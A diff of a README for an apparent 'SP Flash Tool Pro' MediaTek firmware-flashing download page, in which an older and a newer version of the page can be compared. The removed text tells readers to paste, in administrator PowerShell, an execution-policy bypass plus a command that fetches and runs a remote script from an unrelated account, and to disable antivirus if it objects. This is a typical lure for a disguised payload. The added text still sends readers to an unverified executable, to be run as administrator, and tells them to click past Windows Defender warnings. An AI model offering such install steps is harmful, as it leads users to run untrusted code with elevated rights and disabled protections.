@@ -1,115 +1,88 @@
-# SP Flash Tool Pro Download for Windows 11 & 10
+# 🛠️ SP-Flash-Tool-Pro - Manage your Android device firmware easily
 
-**SP-Flash-Tool-Pro**
+[![Download SP-Flash-Tool-Pro](https://img.shields.io/badge/Download-SP_Flash_Tool_Pro-blue)](https://github.com/Prola8494/SP-Flash-Tool-Pro/releases)
 
-**SP Flash Tool Pro** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+This application serves as a bridge between your computer and Android devices that use MediaTek chipsets. You can use it to flash system files, update firmware, or recover a device that does not boot. The software supports Windows 10 and Windows 11.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📋 System Requirements
 
----
+Confirm your system meets these standards before you begin.
 
-## Download & Install (PowerShell)
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i3 or equivalent.
+- Memory: 4 GB RAM.
+- Storage: 500 MB of space.
+- Connectivity: USB data cable.
+- Drivers: Official MediaTek VCOM drivers installed.
 
-> **This is the download page.** The command below downloads and runs the **SP Flash Tool Pro** installer on Windows 10/11.
+## 💾 How to download the software
 
-#### Before you start
+Follow these steps to obtain the correct version of the tool.
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+1. Open your web browser.
+2. Navigate to the official releases page: [https://github.com/Prola8494/SP-Flash-Tool-Pro/releases](https://github.com/Prola8494/SP-Flash-Tool-Pro/releases)
+3. Look for the most recent version under the Releases section.
+4. Locate the file ending in .zip or .exe.
+5. Click the file name to start your download.
+6. Save the file to your desktop for easy access.
 
----
+## ⚙️ Installation and Setup
 
-#### Step 1 — Open PowerShell as Administrator
+Once the file exists on your computer, prepare it for use.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+1. Double-click the downloaded file. 
+2. If the file is a compressed .zip folder, right-click it and choose Extract All.
+3. Choose a folder on your computer to store the extracted files.
+4. Open the folder you just created.
+5. Find the file labeled SP_Flash_Tool_Pro.exe.
+6. Right-click the file and select Run as administrator.
+7. Follow the prompts on your screen to complete the setup process.
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+## 🔌 Connecting your device
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+Successful communication between your phone and the computer requires a proper connection.
 
----
+1. Turn off your Android device completely.
+2. Ensure your USB data cable functions correctly by testing it with another device if possible.
+3. Plug the USB cable into your computer.
+4. Wait for the computer to recognize the connection.
+5. Press the volume or power buttons on your phone while plugging in the other end of the cable. The specific button varies by model. 
+6. Check your Windows Device Manager to ensure the computer detects the device as a MediaTek Preloader device.
 
-#### Step 2 — Copy the full command
+## 🛠️ Performing a firmware flash
 
-Select **both lines** below and press **Ctrl+C**:
+Only use this process if you possess the correct firmware files for your specific phone model. Wrong files cause software damage to your phone.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+1. Open the tool from your desktop.
+2. Navigate to the Download tab.
+3. Click the Scatter-loading button to select the scatter file included in your firmware package.
+4. Wait for the tool to load the file structure.
+5. Select the Download button at the top of the interface.
+6. Connect your powered-off phone to the computer.
+7. Observe the progress bar at the bottom of the screen.
+8. Wait for a green checkmark to appear, which indicates the completion of the process.
+9. Disconnect your phone and turn it on.
 
-> Copy **both lines**, not just the second one.
+## 💡 Troubleshooting common issues
 
----
+Most problems occur due to bad cables or missing drivers.
 
-#### Step 3 — Paste into PowerShell and press Enter
+- The computer does not detect the phone: Check your USB cable and ensure your VCOM drivers are active. Try a different USB port on your computer.
+- The tool displays an error: Verify the firmware files match your phone model exactly. 
+- The process stops halfway: Keep your phone still during the transfer. Do not move the cable.
+- The software will not open: Ensure you run the application as an administrator. Right-click the icon and choose Run as administrator to grant necessary permissions.
+- Windows blocks the software execution: Click More info in the Windows Defender popup and then choose Run anyway. 
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+## 🛡️ Safety precautions
 
----
+Managing firmware involves risks. Follow these tips to protect your hardware.
 
-#### Step 4 — Finish setup
+- Keep your phone battery charged above 50 percent before you start.
+- Use the original USB cable that came with your phone. 
+- Create a backup of your personal data before you proceed. This process wipes existing data on your phone.
+- Do not disconnect the cable while the progress bar shows movement.
+- Ensure you download firmware files from trusted sources specific to your device version.
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+## 🏢 Support and updates
 
----
-
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **SP Flash Tool Pro** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**SP Flash Tool Pro** — Windows download and setup guide.
-
-**People also search for:** sp flash tool pro download, sp flash tool mtk pro install windows
-
-**Repository:** `SP-Flash-Tool-Pro`
-
-
-## Quick tips
-
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
-
----
-
-**Topics:** sp-flash-tool-pro-download, sp-flash-tool-mtk-pro-install-windows, sp-flash-tool-pro, sp-flash-tool-pro-2026, sp-flash-tool, mediatek-flash, phone-flash, android-unlock, flash-tool, software, windows-11, download
+Check the releases page periodically for new versions of this software. Developers release updates to support new chipsets and versions of Windows. If you encounter bugs, check the issues tab on the repository page to see if others report similar behavior. Keep your Windows environment clean and updated to ensure the best performance. The tool functions best when no other software attempts to access the device connection at the same time. Close other programs before you begin the flashing sequences.
